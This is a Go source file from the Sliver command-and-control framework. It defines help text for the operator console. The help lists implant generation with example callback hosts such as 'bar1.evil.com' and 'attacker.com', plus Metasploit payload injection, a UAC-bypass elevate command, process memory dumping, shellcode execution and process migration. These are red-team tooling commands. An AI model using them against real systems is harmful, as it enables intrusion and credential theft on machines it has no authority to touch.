package help

/*
	This file contains all of the long-form help templates, all commands should have a long form help,
	even if the command is pretty simple. Try to include example commands in your template.
*/

import (
	"bytes"
	"text/template"

	consts "github.com/bishopfox/sliver/client/constants"
)

var (
	cmdHelp = map[string]string{
		consts.JobsStr:            jobsHelp,
		consts.SessionsStr:        sessionsHelp,
		consts.BackgroundStr:      backgroundHelp,
		consts.InfoStr:            infoHelp,
		consts.UseStr:             useHelp,
		consts.GenerateStr:        generateHelp,
		consts.NewProfileStr:      newProfileHelp,
		consts.ProfileGenerateStr: generateProfileHelp,

		consts.MsfStr:              msfHelp,
		consts.MsfInjectStr:        msfInjectHelp,
		consts.PsStr:               psHelp,
		consts.PingStr:             pingHelp,
		consts.KillStr:             killHelp,
		consts.LsStr:               lsHelp,
		consts.CdStr:               cdHelp,
		consts.CatStr:              catHelp,
		consts.DownloadStr:         downloadHelp,
		consts.UploadStr:           uploadHelp,
		consts.MkdirStr:            mkdirHelp,
		consts.RmStr:               rmHelp,
		consts.ProcdumpStr:         procdumpHelp,
		consts.ElevateStr:          elevateHelp,
		consts.ImpersonateStr:      impersonateHelp,
		consts.ExecuteAssemblyStr:  executeAssemblyHelp,
		consts.ExecuteShellcodeStr: executeShellcodeHelp,
		consts.MigrateStr:          migrateHelp,
	}

	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
	[[.Bold]]About:[[.Normal]] Manange jobs/listeners.`

	sessionsHelp = `[[.Bold]]Command:[[.Normal]] sessions <options>
[[.Bold]]About:[[.Normal]] List Sliver sessions, and optionally interact or kill a session.`

	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
[[.Bold]]About:[[.Normal]] Background the active Sliver.`

	infoHelp = `[[.Bold]]Command:[[.Normal]] info <sliver name/session>
[[.Bold]]About:[[.Normal]] Get information about a Sliver by name, or for the active Sliver.`

	useHelp = `[[.Bold]]Command:[[.Normal]] use [sliver name/session]
[[.Bold]]About:[[.Normal]] Switch the active Sliver, a valid name must be provided (see sessions).`

	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
[[.Bold]]About:[[.Normal]] Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

[[.Bold]][[.Underline]]++ Command and Control ++[[.Normal]]
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --http, or --dns.
The command requires at least one use of --mtls, --http, or --dns.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
	generate --mtls foo.example.com 

You can also stack the C2 configuration with multiple protocols:
	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


[[.Bold]][[.Underline]]++ Formats ++[[.Normal]]
Supported output formats are Windows PE, Windows DLL, Windows Shellcode (SRDI), Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
	generate --mtls foo.example.com 
	generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
	generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
	generate --os mac --mtls foo.example.com 

To output a Linux ELF executable file, the following command would be used:
	generate --os linux --mtls foo.example.com 


[[.Bold]][[.Underline]]++ DNS Canaries ++[[.Normal]]
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
and which implant file was discovered along with any affected sessions.

[[.Bold]]Important:[[.Normal]] You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated 
canaries and their status using the "canaries" command:
	generate --mtls foo.example.com --canary 1.foobar.com

[[.Bold]][[.Underline]]++ Execution Limits ++[[.Normal]]
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help new-profile'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.
`

	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--name] <options>
[[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Profiles are an easy way to save a sliver configurate and easily generate multiple copies of the binary with the same
settings, but will still have per-binary certificates/obfuscation/etc. This command is used with generate-profile:
	new-profile --name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
	generate-profile mtls-profile
`

	generateProfileHelp = `[[.Bold]]Command:[[.Normal]] generate-profile [name] <options>
[[.Bold]]About:[[.Normal]] Generate a Sliver from a saved profile (see new-profile).`

	msfHelp = `[[.Bold]]Command:[[.Normal]] msf [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in the current process.`

	msfInjectHelp = `[[.Bold]]Command:[[.Normal]] inject [--pid] [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in a remote process.`

	psHelp = `[[.Bold]]Command:[[.Normal]] ps <options>
[[.Bold]]About:[[.Normal]] List processes on remote system.`

	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <sliver name/session>
[[.Bold]]About:[[.Normal]] Ping Sliver by name or the active sliver. This does NOT send an ICMP packet, it just sends an empty 
c2 message round trip to ensure the remote Sliver is still responding to commands.`

	killHelp = `[[.Bold]]Command:[[.Normal]] kill <sliver name/session>
[[.Bold]]About:[[.Normal]] Kill a remote sliver process (does not delete file).`

	lsHelp = `[[.Bold]]Command:[[.Normal]] ls <remote path>
[[.Bold]]About:[[.Normal]] List remote files in current directory, or path if provided.`

	cdHelp = `[[.Bold]]Command:[[.Normal]] cd [remote path]
[[.Bold]]About:[[.Normal]] Change working directory of the active Sliver.`

	pwdHelp = `[[.Bold]]Command:[[.Normal]] pwd
[[.Bold]]About:[[.Normal]] Print working directory of the active Sliver.`

	mkdirHelp = `[[.Bold]]Command:[[.Normal]] mkdir [remote path]
[[.Bold]]About:[[.Normal]] Create a remote directory.`

	rmHelp = `[[.Bold]]Command:[[.Normal]] rm [remote path]
[[.Bold]]About:[[.Normal]] Delete a remote file or directory.`

	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote path> 
[[.Bold]]About:[[.Normal]] Cat a remote file to stdout.`

	downloadHelp = `[[.Bold]]Command:[[.Normal]] download [remote src] <local dst>
[[.Bold]]About:[[.Normal]] Download a file from the remote system.`

	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload [local src] <remote dst>
[[.Bold]]About:[[.Normal]] Upload a file to the remote system.`

	procdumpHelp = `[[.Bold]]Command:[[.Normal]] procdump [pid]
[[.Bold]]About:[[.Normal]] Dumps the process memory given a process identifier (pid)`

	impersonateHelp = `[[.Bold]]Command:[[.Normal]] impersonate [--username] [--process] [--args]
[[.Bold]]About:[[.Normal]] (Windows Only) Run a new process in the context of the designated user`

	elevateHelp = `[[.Bold]]Command:[[.Normal]] elevate
[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new sliver session as an elevated process (UAC bypass)`

	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly [local path to assembly] [arguments]
[[.Bold]]About:[[.Normal]] (Windows Only) Executes the .NET assembly in a child process.
`

	executeShellcodeHelp = `[[.Bold]]Command:[[.Normal]] execute-shellcode [local path to raw shellcode]
[[.Bold]]About:[[.Normal]] Executes the given shellcode in the Sliver process.

[[.Bold]][[.Underline]]++ Shellcode ++[[.Normal]]
Shellcode files should be binary encoded, you can generate Sliver shellcode files with the generage command:
	generate --format shellcode
`

	migrateHelp = `[[.Bold]]Command:[[.Normal]] migrate <pid>
[[.Bold]]About:[[.Normal]] (Windows Only) Migrates into the process designated by <pid>.`
)

const (
	// ANSI Colors
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"
)

// GetHelpFor - Get help string for a command
func GetHelpFor(cmdName string) string {
	if 0 < len(cmdName) {
		if helpTmpl, ok := cmdHelp[cmdName]; ok {
			outputBuf := bytes.NewBufferString("")
			tmpl, _ := template.New("help").Delims("[[", "]]").Parse(helpTmpl)
			tmpl.Execute(outputBuf, struct {
				Normal    string
				Bold      string
				Underline string
				Black     string
				Red       string
				Green     string
				Orange    string
				Blue      string
				Purple    string
				Cyan      string
				Gray      string
			}{
				Normal:    normal,
				Bold:      bold,
				Underline: underline,
				Black:     black,
				Red:       red,
				Green:     green,
				Orange:    orange,
				Blue:      blue,
				Purple:    purple,
				Cyan:      cyan,
				Gray:      gray,
			})
			return outputBuf.String()
		}
	}
	return ""
}
